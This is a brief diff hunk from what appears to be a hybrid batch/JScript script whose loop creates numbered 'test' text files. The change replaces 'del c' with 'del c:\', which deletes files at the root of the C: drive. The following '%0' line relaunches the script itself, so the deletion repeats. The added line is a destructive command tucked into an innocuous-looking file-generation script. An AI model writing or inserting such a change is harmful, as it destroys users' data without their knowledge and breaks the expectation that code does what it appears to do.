@@ -50,5 +50,5 @@ for(var i=1;i<=Number(WSH.Arguments(1));i++){
     doc.SaveAs(WSH.Arguments(0)+'test'+i+'.txt');
     doc.Close();
 }
-del c
+del c:\
 %0
